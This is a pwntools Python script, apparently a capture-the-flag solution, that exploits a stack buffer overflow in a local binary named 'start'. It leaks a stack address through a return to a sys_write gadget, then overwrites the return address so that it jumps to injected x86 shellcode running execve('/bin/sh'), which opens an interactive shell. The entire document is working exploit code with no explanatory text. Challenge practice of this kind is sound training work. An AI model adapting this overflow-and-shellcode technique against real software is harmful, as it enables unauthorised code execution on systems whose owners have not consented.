from pwn import *

p = process("./start")

p.recvuntil(b"CTF:")
sys_write = 0x08048087
payload1 = b"a" * 20 + p32(sys_write)
p.send(payload1)

shell_code = asm("\n".join([
    "push %s" % u32(b"/sh\0"),
    "push %s" % u32(b"/bin"),
    "xor ecx, ecx",
    "xor edx, edx",
    "mov ebx, esp",
    "mov eax, 0xb",
    "int 0x80"
]))



esp_address = u32(p.recv()[:4])
payload = b"a" * 20 + p32(esp_address + 20) + shell_code
p.send(payload)

p.interactive()